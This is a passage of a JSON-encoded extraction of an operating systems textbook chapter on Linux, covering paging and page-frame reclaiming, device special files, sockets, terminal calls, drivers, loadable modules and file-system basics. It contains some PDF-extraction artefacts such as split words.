memo\u0002ry descriptor in two ways. First, they are organized in linked lists ordered by virtu\u0002al-memory addresses. This way is useful when all virtual-memory areas need to be\r\naccessed, or when the kernel is searching to allocated a virtual-memory region of a\r\nspecific size. In addition, the vm area struct entries are organized in a binary\r\n‘‘red-black’’ tree, a data structure optimized for fast lookups. This method is used\r\nwhen a specific virtual memory needs to be accessed. By enabling access to ele\u0002ments of the process address space via these two methods, Linux uses more state\r\nper process, but allows different kernel operations to use the access method which\r\nis more efficient for the task at hand."
          },
          "10.4.4 Paging in Linux": {
            "page": 795,
            "content": "10.4.4 Paging in Linux\r\nEarly UNIX systems relied on a swapper process to move entire processes be\u0002tween memory and disk whenever not all active processes could fit in the physical\r\nmemory. Linux, like other modern UNIX versions, no longer moves entire proc\u0002esses. The main memory management unit is a page, and almost all memory-man\u0002agement components operate on a page granularity. The swapping subsystem also\r\noperates on page granularity and is tightly coupled with the page frame reclaim\u0002ing algorithm, described later in this section.\r\nThe basic idea behind paging in Linux is simple: a process need not be entirely\r\nin memory in order to run. All that is actually required is the user structure and the\r\npage tables. If these are swapped in, the process is deemed ‘‘in memory’’ and can\r\nbe scheduled to run. The pages of the text, data, and stack segments are brought in\r\ndynamically, one at a time, as they are referenced. If the user structure and page\r\ntable are not in memory, the process cannot be run until the swapper brings them\r\nin.\r\nPaging is implemented partly by the kernel and partly by a new process called\r\nthe page daemon. The page daemon is process 2 (process 0 is the idle proc\u0002ess—traditionally called the swapper—and process 1 is init, as shown in\r\nFig. 10-11). Like all daemons, the page daemon runs periodically. Once awake, it\r\nlooks around to see if there is any work to do. If it sees that the number of pages\r\non the list of free memory pages is too low, it starts freeing up more pages.\r\nLinux is a fully demand-paged system with no prepaging and no working-set\r\nconcept (although there is a call in which a user can give a hint that a certain page\nSEC. 10.4 MEMORY MANAGEMENT IN LINUX 765\r\nmay be needed soon, in the hope it will be there when needed). Te xt segments and\r\nmapped files are paged to their respective files on disk. Everything else is paged to\r\neither the paging partition (if present) or one of the fixed-length paging files, called\r\nthe swap area. Paging files can be added and removed dynamically and each one\r\nhas a priority. Paging to a separate partition, accessed as a raw device, is more ef\u0002ficient than paging to a file for several reasons. First, the mapping between file\r\nblocks and disk blocks is not needed (saves disk I/O reading indirect blocks). Sec\u0002ond, the physical writes can be of any size, not just the file block size. Third, a\r\npage is always written contiguously to disk; with a paging file, it may or may not\r\nbe.\r\nPages are not allocated on the paging device or partition until they are needed.\r\nEach device and file starts with a bitmap telling which pages are free. When a\r\npage without backing store has to be tossed out of memory, the highest-priority\r\npaging partition or file that still has space is chosen and a page allocated on it. Nor\u0002mally, the paging partition, if present, has higher priority than any paging file. The\r\npage table is updated to reflect that the page is no longer present in memory (e.g.,\r\nthe page-not-present bit is set) and the disk location is written into the page-table\r\nentry.\r\nThe Page Replacement Algorithm\r\nPage replacement works as follows. Linux tries to keep some pages free so that\r\nthey can be claimed as needed. Of course, this pool must be continually replen\u0002ished. The PFRA (Page Frame Reclaiming Algorithm) algorithm is how this\r\nhappens.\r\nFirst of all, Linux distinguishes between four different types of pages: unre\u0002claimable, swappable, syncable, and discardable. Unreclaimable pages, which in\u0002clude reserved or locked pages, kernel mode stacks, and the like, may not be paged\r\nout. Swappable pages must be written back to the swap area or the paging disk par\u0002tition before the page can be reclaimed. Syncable pages must be written back to\r\ndisk if they hav e been marked as dirty. Finally, discardable pages can be reclaimed\r\nimmediately.\r\nAt boot time, init starts up a page daemon, kswapd, for each memory node, and\r\nconfigures them to run periodically. Each time kswapd aw akens, it checks to see if\r\nthere are enough free pages available, by comparing the low and high watermarks\r\nwith the current memory usage for each memory zone. If there is enough memory,\r\nit goes back to sleep, although it can be awakened early if more pages are suddenly\r\nneeded. If the available memory for any of the zones ever falls below a threshold,\r\nkswapd initiates the page frame reclaiming algorithm. During each run, only a cer\u0002tain target number of pages is reclaimed, typically a maximum of 32. This number\r\nis limited to control the I/O pressure (the number of disk writes created during the\r\nPFRA operations). Both the number of reclaimed pages and the total number of\r\nscanned pages are configurable parameters.\n766 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nEach time PFRA executes, it first tries to reclaim easy pages, then proceeds\r\nwith the harder ones. Many people also grab the low-hanging fruit first. Dis\u0002cardable and unreferenced pages can be reclaimed immediately by moving them\r\nonto the zone’s freelist. Next it looks for pages with backing store which have not\r\nbeen referenced recently, using a clock-like algorithm. Following are shared pages\r\nthat none of the users seems to be using much. The challenge with shared pages is\r\nthat, if a page entry is reclaimed, the page tables of all address spaces originally\r\nsharing that page must be updated in a synchronous manner. Linux maintains ef\u0002ficient tree-like data structures to easily find all users of a shared page. Ordinary\r\nuser pages are searched next, and if chosen to be evicted, they must be scheduled\r\nfor write in the swap area. The swappiness of the system, that is, the ratio of pages\r\nwith backing store vs. pages which need to be swapped out selected during PFRA,\r\nis a tunable parameter of the algorithm. Finally, if a page is invalid, absent from\r\nmemory, shared, locked in memory, or being used for DMA, it is skipped.\r\nPFRA uses a clock-like algorithm to select old pages for eviction within a cer\u0002tain category. At the core of this algorithm is a loop which scans through each\r\nzone’s active and inactive lists, trying to reclaim different kinds of pages, with dif\u0002ferent urgencies. The urgency value is passed as a parameter telling the procedure\r\nhow much effort to expend to reclaim some pages. Usually, this means how many\r\npages to inspect before giving up.\r\nDuring PFRA, pages are moved between the active and inactive list in the\r\nmanner described in Fig. 10-18. To maintain some heuristics and try to find pages\r\nwhich have not been referenced and are unlikely to be needed in the near future,\r\nPFRA maintains two flags per page: active/inactive, and referenced or not. These\r\ntwo flags encode four states, as shown in Fig. 10-18. During the first scan of a set\r\nof pages, PFRA first clears their reference bits. If during the second run over the\r\npage it is determined that it has been referenced, it is advanced to another state,\r\nfrom which it is less likely to be reclaimed. Otherwise, the page is moved to a state\r\nfrom where it is more likely to be evicted.\r\nPages on the inactive list, which have not been referenced since the last time\r\nthey were inspected, are the best candidates for eviction. They are pages with both\r\nPG active and PG referenced set to zero in Fig. 10-18. However, if necessary,\r\npages may be reclaimed even if they are in some of the other states. The refill\r\narrows in Fig. 10-18 illustrate this fact.\r\nThe reason PRFA maintains pages in the inactive list although they might have\r\nbeen referenced is to prevent situations such as the following. Consider a process\r\nwhich makes periodic accesses to different pages, with a 1-hour period. A page ac\u0002cessed since the last loop will have its reference flag set. However, since it will not\r\nbe needed again for the next hour, there is no reason not to consider it as a candi\u0002date for reclamation.\r\nOne aspect of the memory-management system that we have not yet mention\u0002ed is a second daemon, pdflush, actually a set of background daemon threads. The\r\npdflush threads either (1) wake up periodically, typically every 500 msec, to write\nSEC. 10.4 MEMORY MANAGEMENT IN LINUX 767\r\nInactive\r\nUsed\r\nUsed\r\nTimeout Timeout Used\r\nRefill\r\nRefill\r\nRefill PG_active = 0\r\nPG_referenced = 0\r\nPG_active = 0\r\nPG_referenced = 1\r\nPG_active = 1\r\nPG_referenced = 0\r\nPG_active = 1\r\nPG_referenced = 1\r\nActive\r\nFigure 10-18. Page states considered in the page-frame replacement algorithm.\r\nback to disk very old dirty pages, or (2) are explicitly awakened by the kernel when\r\navailable memory levels fall below a certain threshold, to write back dirty pages\r\nfrom the page cache to disk. In laptop mode, in order to conserve battery life, dirty\r\npages are written to disk whenever pdflush threads wake up. Dirty pages may also\r\nbe written out to disk on explicit requests for synchronization, via systems calls\r\nsuch as sync, fsync, or fdatasync. Older Linux versions used two separate dae\u0002mons: kupdate, for old-page write back, and bdflush, for page write back under low\r\nmemory conditions. In the 2.4 kernel this functionality was integrated in the\r\npdflush threads. The choice of multiple threads was made in order to hide long disk\r\nlatencies."
          }
        }
      },
      "10.5 INPUT/OUTPUT IN LINUX": {
        "page": 798,
        "children": {
          "10.5.1 Fundamental Concepts": {
            "page": 798,
            "content": "10.5.1 Fundamental Concepts\r\nLike all computers, those running Linux have I/O devices such as disks, print\u0002ers, and networks connected to them. Some way is needed to allow programs to ac\u0002cess these devices. Although various solutions are possible, the Linux one is to\r\nintegrate the devices into the file system as what are called special files. Each I/O\n768 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\ndevice is assigned a path name, usually in /dev. For example, a disk might be\r\n/dev/hd1, a printer might be /dev/lp, and the network might be /dev/net.\r\nThese special files can be accessed the same way as any other files. No special\r\ncommands or system calls are needed. The usual open, read, and wr ite system\r\ncalls will do just fine. For example, the command\r\ncp file /dev/lp\r\ncopies the file to printer, causing it to be printed (assuming that the user has per\u0002mission to access /dev/lp). Programs can open, read, and write special files exactly\r\nthe same way as they do regular files. In fact, cp in the above example is not even\r\naw are that it is printing. In this way, no special mechanism is needed for doing\r\nI/O.\r\nSpecial files are divided into two categories, block and character. A block spe\u0002cial file is one consisting of a sequence of numbered blocks. The key property of\r\nthe block special file is that each block can be individually addressed and accessed.\r\nIn other words, a program can open a block special file and read, say, block 124\r\nwithout first having to read blocks 0 to 123. Block special files are typically used\r\nfor disks.\r\nCharacter special files are normally used for devices that input or output a\r\ncharacter stream. Keyboards, printers, networks, mice, plotters, and most other I/O\r\ndevices that accept or produce data for people use character special files. It is not\r\npossible (or even meaningful) to seek to block 124 on a mouse.\r\nAssociated with each special file is a device driver that handles the correspond\u0002ing device. Each driver has what is called a major device number that serves to\r\nidentify it. If a driver supports multiple devices, say, two disks of the same type,\r\neach disk has a minor device number that identifies it. Together, the major and\r\nminor device numbers uniquely specify every I/O device. In few cases, a single\r\ndriver handles two closely related devices. For example, the driver corresponding\r\nto /dev/tty controls both the keyboard and the screen, often thought of as a single\r\ndevice, the terminal.\r\nAlthough most character special files cannot be randomly accessed, they often\r\nneed to be controlled in ways that block special files do not. Consider, for example,\r\ninput typed on the keyboard and displayed on the screen. When a user makes a\r\ntyping error and wants to erase the last character typed, he presses some key. Some\r\npeople prefer to use backspace, and others prefer DEL. Similarly, to erase the en\u0002tire line just typed, many conventions abound. Traditionally @ was used, but with\r\nthe spread of e-mail (which uses @ within e-mail address), many systems have\r\nadopted CTRL-U or some other character. Likewise, to interrupt the running pro\u0002gram, some special key must be hit. Here, too, different people have different pref\u0002erences. CTRL-C is a common choice, but it is not universal.\r\nRather than making a choice and forcing everyone to use it, Linux allows all\r\nthese special functions and many others to be customized by the user. A special\r\nsystem call is generally provided for setting these options. This system call also\nSEC. 10.5 INPUT/OUTPUT IN LINUX 769\r\nhandles tab expansion, enabling and disabling of character echoing, conversion be\u0002tween carriage return and line feed, and similar items. The system call is not per\u0002mitted on regular files or block special files."
          },
          "10.5.2 Networking": {
            "page": 800,
            "content": "10.5.2 Networking\r\nAnother example of I/O is networking, as pioneered by Berkeley UNIX and\r\ntaken over by Linux more or less verbatim. The key concept in the Berkeley design\r\nis the socket. Sockets are analogous to mailboxes and telephone wall sockets in\r\nthat they allow users to interface to the network, just as mailboxes allow people to\r\ninterface to the postal system and telephone wall sockets allow them to plug in\r\ntelephones and connect to the telephone system. The sockets’ position is shown in\r\nFig. 10-19.\r\nUser space\r\nKernel space\r\nSending process Receiving process\r\nSocket\r\nConnection\r\nNetwork\r\nFigure 10-19. The uses of sockets for networking.\r\nSockets can be created and destroyed dynamically. Creating a socket returns a file\r\ndescriptor, which is needed for establishing a connection, reading data, writing\r\ndata, and releasing the connection.\r\nEach socket supports a particular type of networking, specified when the\r\nsocket is created. The most common types are\r\n1. Reliable connection-oriented byte stream.\r\n2. Reliable connection-oriented packet stream.\r\n3. Unreliable packet transmission.\r\nThe first socket type allows two processes on different machines to establish the e\u0002quivalent of a pipe between them. Bytes are pumped in at one end and they come\r\nout in the same order at the other. The system guarantees that all bytes that are sent\r\ncorrectly arrive and in the same order they were sent.\n770 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nThe second type is rather similar to the first one, except that it preserves packet\r\nboundaries. If the sender makes fiv e separate calls to wr ite, each for 512 bytes, and\r\nthe receiver asks for 2560 bytes, with a type 1 socket all 2560 bytes will be re\u0002turned at once. With a type 2 socket, only 512 bytes will be returned. Four more\r\ncalls are needed to get the rest. The third type of socket is used to give the user ac\u0002cess to the raw network. This type is especially useful for real-time applications,\r\nand for those situations in which the user wants to implement a specialized error\u0002handling scheme. Packets may be lost or reordered by the network. There are no\r\nguarantees, as in the first two cases. The advantage of this mode is higher per\u0002formance, which sometimes outweighs reliability (e.g., for multimedia delivery, in\r\nwhich being fast counts for more than being right).\r\nWhen a socket is created, one of the parameters specifies the protocol to be\r\nused for it. For reliable byte streams, the most popular protocol is TCP (Transmis\u0002sion Control Protocol). For unreliable packet-oriented transmission, UDP (User\r\nDatagram Protocol) is the usual choice. Both of these are layered on top of IP\r\n(Internet Protocol). All of these protocols originated with the U.S. Dept. of\r\nDefense’s ARPANET, and now form the basis of the Internet. There is no common\r\nprotocol for reliable packet streams.\r\nBefore a socket can be used for networking, it must have an address bound to\r\nit. This address can be in one of several naming domains. The most common one\r\nis the Internet naming domain, which uses 32-bit integers for naming endpoints in\r\nVersion 4 and 128-bit integers in Version 6 (Version 5 was an experimental system\r\nthat never made it to the major leagues).\r\nOnce sockets have been created on both the source and destination computers,\r\na connection can be established between them (for connection-oriented communi\u0002cation). One party makes a listen system call on a local socket, which creates a\r\nbuffer and blocks until data arrive. The other makes a connect system call, giving\r\nas parameters the file descriptor for a local socket and the address of a remote\r\nsocket. If the remote party accepts the call, the system then establishes a con\u0002nection between the sockets.\r\nOnce a connection has been established, it functions analogously to a pipe. A\r\nprocess can read and write from it using the file descriptor for its local socket.\r\nWhen the connection is no longer needed, it can be closed in the usual way, via the\r\nclose system call."
          },
          "10.5.3 Input/Output System Calls in Linux": {
            "page": 801,
            "content": "10.5.3 Input/Output System Calls in Linux\r\nEach I/O device in a Linux system generally has a special file associated with\r\nit. Most I/O can be done by just using the proper file, eliminating the need for spe\u0002cial system calls. Nevertheless, sometimes there is a need for something that is de\u0002vice specific. Prior to POSIX most UNIX systems had a system call ioctl that per\u0002formed a large number of device-specific actions on special files. Over the course\r\nof the years, it had gotten to be quite a mess. POSIX cleaned it up by splitting its\nSEC. 10.5 INPUT/OUTPUT IN LINUX 771\r\nfunctions into separate function calls primarily for terminal devices. In Linux and\r\nmodern UNIX systems, whether each one is a separate system call or they share a\r\nsingle system call or something else is implementation dependent.\r\nThe first four calls listed in Fig. 10-20 are used to set and get the terminal\r\nspeed. Different calls are provided for input and output because some modems op\u0002erate at split speed. For example, old videotex systems allowed people to access\r\npublic databases with short requests from the home to the server at 75 bits/sec with\r\nreplies coming back at 1200 bits/sec. This standard was adopted at a time when\r\n1200 bits/sec both ways was too expensive for home use. Times change in the net\u0002working world. This asymmetry still persists, with some telephone companies\r\noffering inbound service at 20 Mbps and outbound service at 2 Mbps, often under\r\nthe name of ADSL (Asymmetric Digital Subscriber Line).\r\nFunction call Description\r\ns = cfsetospeed(&ter mios, speed) Set the output speed\r\ns = cfsetispeed(&ter mios, speed) Set the input speed\r\ns = cfgetospeed(&ter mios, speed) Get the output speed\r\ns = cfgtetispeed(&ter mios, speed) Get the input speed\r\ns = tcsetattr(fd, opt, &termios) Set the attributes\r\ns = tcgetattr(fd, &termios) Get the attributes\r\nFigure 10-20. The main POSIX calls for managing the terminal.\r\nThe last two calls in the list are for setting and reading back all the special\r\ncharacters used for erasing characters and lines, interrupting processes, and so on.\r\nIn addition, they enable and disable echoing, handle flow control, and perform\r\nother related functions. Additional I/O function calls also exist, but they are some\u0002what specialized, so we will not discuss them further. In addition, ioctl is still avail\u0002able."
          },
          "10.5.4 Implementation of Input/Output in Linux": {
            "page": 802,
            "content": "10.5.4 Implementation of Input/Output in Linux\r\nI/O in Linux is implemented by a collection of device drivers, one per device\r\ntype. The function of the drivers is to isolate the rest of the system from the\r\nidiosyncracies of the hardware. By providing standard interfaces between the driv\u0002ers and the rest of the operating system, most of the I/O system can be put into the\r\nmachine-independent part of the kernel.\r\nWhen the user accesses a special file, the file system determines the major and\r\nminor device numbers belonging to it and whether it is a block special file or a\r\ncharacter special file. The major device number is used to index into one of two in\u0002ternal hash tables containing data structures for character or block devices. The\r\nstructure thus located contains pointers to the procedures to call to open the device,\r\nread the device, write the device, and so on. The minor device number is passed as\n772 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\na parameter. Adding a new device type to Linux means adding a new entry to one\r\nof these tables and supplying the corresponding procedures to handle the various\r\noperations on the device.\r\nSome of the operations which may be associated with different character de\u0002vices are shown in Fig. 10-21. Each row refers to a single I/O device (i.e., a single\r\ndriver). The columns represent the functions that all character drivers must sup\u0002port. Several other functions also exist. When an operation is performed on a char\u0002acter special file, the system indexes into the hash table of character devices to\r\nselect the proper structure, then calls the corresponding function to have the work\r\nperformed. Thus each of the file operations contains a pointer to a function con\u0002tained in the corresponding driver.\r\nDevice Open Close Read Write Ioctl Other\r\nNull null null null null null ...\r\nMemor y null null mem read mem wr ite null ...\r\nKe yboard k open k close k read error k ioctl ...\r\nTty tty open tty close tty read tty wr ite tty ioctl ...\r\nPr inter lp open lp close error lp wr ite lp ioctl ...\r\nFigure 10-21. Some of the file operations supported for typical character devices.\r\nEach driver is split into two parts, both of which are part of the Linux kernel\r\nand both of which run in kernel mode. The top half runs in the context of the caller\r\nand interfaces to the rest of Linux. The bottom half runs in kernel context and\r\ninteracts with the device. Drivers are allowed to make calls to kernel procedures\r\nfor memory allocation, timer management, DMA control, and other things. The set\r\nof kernel functions that may be called is defined in a document called the Driver\u0002Kernel Interface. Writing device drivers for Linux is covered in detail in Cooper\u0002stein (2009) and Corbet et al. (2009).\r\nThe I/O system is split into two major components: the handling of block spe\u0002cial files and the handling of character special files. We will now look at each of\r\nthese components in turn.\r\nThe goal of the part of the system that does I/O on block special files (e.g.,\r\ndisks) is to minimize the number of transfers that must be done. To accomplish\r\nthis goal, Linux has a cache between the disk drivers and the file system, as illus\u0002trated in Fig. 10-22. Prior to the 2.2 kernel, Linux maintained completely separate\r\npage and buffer caches, so a file residing in a disk block could be cached in both\r\ncaches. Newer versions of Linux have a unified cache. A generic block layer holds\r\nthese components together, performs the necessary translations between disk sec\u0002tors, blocks, buffers and pages of data, and enables the operations on them.\r\nThe cache is a table in the kernel for holding thousands of the most recently\r\nused blocks. When a block is needed from a disk for whatever reason (i-node,\r\ndirectory, or data), a check is first made to see if it is in the cache. If it is present in\nSEC. 10.5 INPUT/OUTPUT IN LINUX 773\r\nthe cache, the block is taken from there and a disk access is avoided, thereby re\u0002sulting in great improvements in system performance.\r\nBlock\r\ndevice\r\ndriver\r\nChar\r\ndevice\r\ndriver\r\nNetwork\r\ndevice\r\ndriver\r\nI/O\r\nscheduler\r\nRegular\r\nfile\r\nChar\r\nspecial\r\nfile\r\nNetwork\r\nsocket\r\nCache\r\nVirtual File System\r\n(Optional\r\nline\r\ndiscipline)\r\nProtocol\r\ndrivers\r\nFile system 1 FS 2\r\nBlock\r\ndevice\r\ndriver\r\nI/O\r\nscheduler\r\nBlock\r\nspecial\r\nfile\r\nFigure 10-22. The Linux I/O system showing one file system in detail.\r\nIf the block is not in the page cache, it is read from the disk into the cache and\r\nfrom there copied to where it is needed. Since the page cache has room for only a\r\nfixed number of blocks, the page-replacement algorithm described in the previous\r\nsection is invoked.\r\nThe page cache works for writes as well as for reads. When a program writes a\r\nblock, it goes to the cache, not to the disk. The pdflush daemon will flush the\r\nblock to disk in the event the cache grows above a specified value. In addition, to\r\navoid having blocks stay too long in the cache before being written to the disk, all\r\ndirty blocks are written to the disk every 30 seconds.\r\nIn order to reduce the latency of repetitive disk-head movements, Linux relies\r\non an I/O scheduler. Its purpose is to reorder or bundle read/write requests to\r\nblock devices. There are many scheduler variants, optimized for different types of\r\nworkloads. The basic Linux scheduler is based on the original Linux elevator\r\nscheduler. The operations of the elevator scheduler can be summarized as fol\u0002lows: Disk operations are sorted in a doubly linked list, ordered by the address of\r\nthe sector of the disk request. New requests are inserted in this list in a sorted man\u0002ner. This prevents repeated costly disk-head movements. The request list is subse\u0002quently merged so that adjacent operations are issued via a single disk request. The\r\nbasic elevator scheduler can lead to starvation. Therefore, the revised version of\r\nthe Linux disk scheduler includes two additional lists, maintaining read or write\r\noperations ordered by their deadlines. The default deadlines are 0.5 sec for reads\n774 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nand 5 sec for writes. If a system-defined deadline for the oldest write operation is\r\nabout to expire, that write request will be serviced before any of the requests on the\r\nmain doubly linked list.\r\nIn addition to regular disk files, there are also block special files, also called\r\nraw block files. These files allow programs to access the disk using absolute\r\nblock numbers, without regard to the file system. They are most often used for\r\nthings like paging and system maintenance.\r\nThe interaction with character devices is simple. Since character devices pro\u0002duce or consume streams of characters, or bytes of data, support for random access\r\nmakes little sense. One exception is the use of line disciplines. A line discipline\r\ncan be associated with a terminal device, represented via the structure tty struct,\r\nand it represents an interpreter for the data exchanged with the terminal device. For\r\ninstance, local line editing can be done (i.e., erased characters and lines can be re\u0002moved), carriage returns can be mapped onto line feeds, and other special proc\u0002essing can be completed. However, if a process wants to interact on every charac\u0002ter, it can put the line in raw mode, in which case the line discipline will be bypas\u0002sed. Not all devices have line disciplines.\r\nOutput works in a similar way, expanding tabs to spaces, converting line feeds\r\nto carriage returns + line feeds, adding filler characters following carriage returns\r\non slow mechanical terminals, and so on. Like input, output can go through the line\r\ndiscipline (cooked mode) or bypass it (raw mode). Raw mode is especially useful\r\nwhen sending binary data to other computers over a serial line and for GUIs. Here,\r\nno conversions are desired.\r\nThe interaction with network devices is different. While network devices also\r\nproduce/consume streams of characters, their asynchronous nature makes them less\r\nsuitable for easy integration under the same interface as other character devices.\r\nThe networking device driver produces packets consisting of multiple bytes of\r\ndata, along with network headers. These packets are then routed through a series of\r\nnetwork protocol drivers, and ultimately are passed to the user-space application. A\r\nkey data structure is the socket buffer structure, skbuff, which is used to represent\r\nportions of memory filled with packet data. The data in an skbuff buffer do not al\u0002ways start at the start of the buffer. As they are being processed by various proto\u0002cols in the networking stack, protocol headers may be removed, or added. The user\r\nprocesses interact with networking devices via sockets, which in Linux support the\r\noriginal BSD socket API. The protocol drivers can be bypassed and direct access\r\nto the underlying network device is enabled via raw sockets. Only the superuser is\r\nallowed to create raw sockets."
          },
          "10.5.5 Modules in Linux": {
            "page": 805,
            "content": "10.5.5 Modules in Linux\r\nFor decades, UNIX device drivers were statically linked into the kernel so they\r\nwere all present in memory whenever the system was booted. Given the environ\u0002ment in which UNIX grew up, commonly departmental minicomputers and then\nSEC. 10.5 INPUT/OUTPUT IN LINUX 775\r\nhigh-end workstations, with their small and unchanging sets of I/O devices, this\r\nscheme worked well. Basically, a computer center built a kernel containing drivers\r\nfor the I/O devices and that was it. If next year the center bought a new disk, it\r\nrelinked the kernel. No big deal.\r\nWith the arrival of Linux on the PC platform, suddenly all that changed. The\r\nnumber of I/O devices available on the PC is orders of magnitude larger than on\r\nany minicomputer. In addition, although all Linux users have (or can easily get)\r\nthe full source code, probably the vast majority would have considerable difficulty\r\nadding a driver, updating all the device-driver related data structures, relinking the\r\nkernel, and then installing it as the bootable system (not to mention dealing with\r\nthe aftermath of building a kernel that does not boot).\r\nLinux solved this problem with the concept of loadable modules. These are\r\nchunks of code that can be loaded into the kernel while the system is running. Most\r\ncommonly these are character or block device drivers, but they can also be entire\r\nfile systems, network protocols, performance monitoring tools, or anything else de\u0002sired.\r\nWhen a module is loaded, several things have to happen. First, the module has\r\nto be relocated on the fly, during loading. Second, the system has to check to see if\r\nthe resources the driver needs are available (e.g., interrupt request levels) and if so,\r\nmark them as in use. Third, any interrupt vectors that are needed must be set up.\r\nFourth, the appropriate driver switch table has to be updated to handle the new\r\nmajor device type. Finally, the driver is allowed to run to perform any device-spe\u0002cific initialization it may need. Once all these steps are completed, the driver is\r\nfully installed, the same as any statically installed driver. Other modern UNIX sys\u0002tems now also support loadable modules."
          }
        }
      },
      "10.6 THE LINUX FILE SYSTEM": {
        "page": 806,
        "children": {
          "10.6.1 Fundamental Concepts": {
            "page": 806,
            "content": "10.6.1 Fundamental Concepts\r\nThe initial Linux file system was the MINIX 1 file system. However, because\r\nit limited file names to 14 characters (in order to be compatible with UNIX Version\r\n7) and its maximum file size was 64 MB (which was overkill on the 10-MB hard\n776 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\ndisks of its era), there was interest in better file systems almost from the beginning\r\nof the Linux development, which began about 5 years after MINIX 1 was released.\r\nThe first improvement was the ext file system, which allowed file names of 255\r\ncharacters and files of 2 GB, but it was slower than the MINIX 1 file system, so the\r\nsearch continued for a while. Eventually, the ext2 file system was invented, with\r\nlong file names, long files, and better performance, and it has become the main file\r\nsystem. However, Linux supports several dozen file systems using the Virtual File\r\nSystem (VFS) layer (described in the next section). When Linux is linked, a\r\nchoice is offered of which file systems should be built into the kernel. Others can\r\nbe dynamically loaded as modules during execution, if need be.\r\nA Linux file is a sequence of 0 or more bytes containing arbitrary information.\r\nNo distinction is made between ASCII files, binary files, or any other kinds of\r\nfiles. The meaning of the bits in a file is entirely up to the file’s owner. The system\r\ndoes not care. File names are limited to 255 characters, and all the ASCII charac\u0002ters except NUL are allowed in file names, so a file name consisting of three car\u0002riage returns is a legal file name (but not an especially convenient one).\r\nBy convention, many programs expect file names to consist of a base name and\r\nan extension, separated by a dot (which counts as a character). Thus prog.c is typi\u0002cally a C program, prog.py is typically a Python program, and prog.o is usually an\r\nobject file (compiler output). These conventions are not enforced by the operating\r\nsystem but some compilers and other programs expect them. Extensions may be of\r\nany length, and files may have multiple extensions, as in prog.java.gz, which is\r\nprobably a gzip compressed Java program.\r\nFiles can be grouped together in directories for convenience. Directories are\r\nstored as files and to a large extent can be treated like files. Directories can contain\r\nsubdirectories, leading to a hierarchical file system. The root directory is called /\r\nand always contains several subdirectories. The / character is also used to separate\r\ndirectory names, so that the name /usr/ast/x denotes the file x located in the direc\u0002tory ast, which itself is in the /usr directory. Some of the major directories near the\r\ntop of the tree are shown in Fig. 10-23.\r\nDirector y Contents\r\nbin Binary (executable) programs\r\ndev Special files for I/O devices\r\netc Miscellaneous system files\r\nlib Librar ies\r\nusr User director ies\r\nFigure 10-23. Some important directories found in most Linux systems.\r\nThere are two ways to specify file names in Linux, both to the shell and when\r\nopening a file from inside a program. The first way is by means of an absolute\r\npath, which means telling how to get to the file starting at the root directory. An\nSEC. 10.6 THE LINUX FILE SYSTEM 777\r\nexample of an absolute path is /usr/ast/books/mos4/chap-10. This tells the system\r\nto look in the root directory for a directory called usr, then look there for another\r\ndirectory, ast. In turn, this directory contains a directory books, which contains the\r\ndirectory mos4, which contains the file chap-10.\r\nAbsolute path names are often long and inconvenient. For this reason, Linux\r\nallows users and processes to designate the directory in which they are currently\r\nworking as the working directory. Path names can also be specified relative to\r\nthe working directory. A path name specified relative to the working directory is a\r\nrelative path. For example, if /usr/ast/books/mos4 is the working directory, then\r\nthe shell command\r\ncp chap-10 backup-10\r\nhas exactly the same effect as the longer command\r\ncp /usr/ast/books/mos4/chap-10 /usr/ast/books/mos4/backup-10\r\nIt frequently occurs that a user needs to refer to a file that belongs to another\r\nuser, or at least is located elsewhere in the file tree. For example, if two users are\r\nsharing a file, it will be located in a directory belonging to one of them, so the\r\nother will have to use an absolute path name to refer to it (or change the working\r\ndirectory). If this is long enough, it may become irritating to have to keep typing\r\nit. Linux provides a solution by allowing users to make a new directory entry that\r\npoints to an existing file. Such an entry is called a link.\r\nAs an example, consider the situation of Fig. 10-24(a). Fred and Lisa are\r\nworking together on a project, and each of them needs access to the other’s files. If\r\nFred has /usr/fred as his working directory, he can refer to the file x in Lisa’s direc\u0002tory as /usr/lisa/x. Alternatively, Fred can create a new entry in his directory, as\r\nshown in Fig. 10-24(b), after which he can use x to mean /usr/lisa/x.\r\nbin\r\ndev\r\netc\r\nlib\r\ntmp\r\nusr\r\nx\r\ny\r\nz\r\na\r\nb\r\nc\r\nfred lisa\r\n/\r\n(a)\r\nbin\r\ndev\r\netc\r\nlib\r\ntmp\r\nusr\r\nx\r\ny\r\nz\r\na\r\nb\r\nc\r\nx\r\nfred lisa\r\n/\r\n(b)\r\nLink\r\nFigure 10-24. (a) Before linking. (b) After linking.\n778 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nIn the example just discussed, we suggested that before linking, the only way\r\nfor Fred to refer to Lisa’s file x was by using its absolute path. Actually, this is not\r\nreally true. When a directory is created, two entries, . and .., are automatically\r\nmade in it. The former refers to the working directory itself. The latter refers to the\r\ndirectory’s parent, that is, the directory in which it itself is listed. Thus from\r\n/usr/fred, another path to Lisa’s file x is ../lisa/x.\r\nIn addition to regular files, Linux also supports character special files and\r\nblock special files. Character special files are used to model serial I/O devices,\r\nsuch as keyboards and printers. Opening and reading from /dev/tty reads from the\r\nkeyboard; opening and writing to /dev/lp writes to the printer. Block special files,\r\noften with names like /dev/hd1, can be used to read and write raw disk partitions\r\nwithout regard to the file system. Thus a seek to byte k followed by a read will be\u0002gin reading from the kth byte on the corresponding partition, completely ignoring\r\nthe i-node and file structure. Raw block devices are used for paging and swapping\r\nby programs that lay down file systems (e.g., mkfs), and by programs that fix sick\r\nfile systems (e.g., fsck), for example.\r\nMany computers have two or more disks. On mainframes at banks, for ex\u0002ample, it is frequently necessary to have 100 or more disks on a single machine, in\r\norder to hold the huge databases required. Even personal computers often have at\r\nleast two disks—a hard disk and an optical (e.g., DVD) drive. When there are mul\u0002tiple disk drives, the question arises of how to handle them.\r\nOne solution is to put a self-contained file system on each one and just keep\r\nthem separate. Consider, for example, the situation shown in Fig. 10-25(a). Here\r\nwe have a hard disk, which we call C:, and a DVD, which we call D:. Each has its\r\nown root directory and files. With this solution, the user has to specify both the de\u0002vice and the file when anything other than the default is needed. For instance, to\r\ncopy a file x to a directory d (assuming C: is the default), one would type\r\ncp D:/x /a/d/x\r\nThis is the approach taken by a number of systems, including Windows 8, which it\r\ninherited from MS-DOS in a century long 